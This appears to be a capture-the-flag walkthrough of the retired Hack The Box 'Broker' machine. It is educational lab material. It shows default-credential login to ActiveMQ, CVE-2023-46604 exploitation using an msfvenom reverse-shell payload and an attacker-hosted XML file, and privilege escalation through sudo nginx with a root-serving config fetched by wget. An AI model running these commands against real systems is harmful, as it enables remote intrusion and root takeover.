---
title : Broker
---

This is a retired Linux box from Hack The Box.

`Date : 21 Dec 2023 Thursday`

### Table of Content 

1. [Recon](#recon)
2. [Shell as activemq](#shell-as-activemq)
3. [Privilege escalation](#privilege-escalation)


### Recon

#### Nmap 

```
nmap --min-rate 1000 -p- -Pn 10.129.230.87 -oN nmap_tcp.txt
```

Output : 

![Screenshot from 2023-12-21 14-23-15](https://github.com/kris3c/kris3c.github.io/assets/128035061/75531d30-1c01-4798-8f6c-b0cffe8950b7)



So we can see different ports are open on the machine lets start with port 80.

![Screenshot 2023-12-21 at 14-25-41 Apache ActiveMQ](https://github.com/kris3c/kris3c.github.io/assets/128035061/8369e271-641a-44ca-a626-a16848659c28)

so we can see here ActiveMQ is running lets check the version 

Visiting /admin endpoint 

Trying with default credentials 

```
Username: Admin
Password : Admin
```

It worked

![Screenshot 2023-12-21 at 14-29-10 localhost ActiveMQ Console](https://github.com/kris3c/kris3c.github.io/assets/128035061/99b34b74-bdd4-4871-b0e6-6c69a870c53b)

we can see the version of the activemq that is **5.15.15**

### Shell as activemq 

Upon Searching for exploit related to this version i came across this repo: 

[CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ](https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ)

By following the instruction we can easily get the shell :

```
git clone https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ.git
```

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST={Your_Listener_IP/Host} LPORT={Your_Listener_Port} -f elf -o test.elf
```

```
python3 -m http.server
```

Edit the file poc-linux.xml and adress for the poc-linux.xml 

```
go run main.go -i {Target_IP} -u http://{IP_Of_Hosted_XML_File}:$RPORT/poc-linux.xml
```


### Privilege escalation

```
sudo -l 
```

![Screenshot from 2023-12-21 14-37-13](https://github.com/kris3c/kris3c.github.io/assets/128035061/aca8b287-5bc0-4e5a-a830-d9521dea4395)

we can execute the nginx with root privileges so let's start a web server which give is root access to the server on which it is running

```
cat /etc/nginx/nginx.conf | grep -v "/#" 
```

```
cat /etc/nginx/sites-enabled/default 
```

make a file on your system 

```
nano nginx.conf
```

```
user root;
worker_processes auto;
pid /run/nginx2.pid;
include /etc/nginx/modules-enabled/*.conf;
events {
	worker_connections 768;
}

http {
	server {
    		listen 1337;
    		location / {
    			root /;
    		}
        
      }
}

```

start python server 

```
python -m http.server
```

Download it on the machine in the /dev/shm directory

```
wget http://$RHOST:8000/nginx.conf
```

start the server

```
sudo nginx -c /dev/shm/nginx.conf
```

download the flag :

```
 curl http://localhost:1337/root/root.txt
```
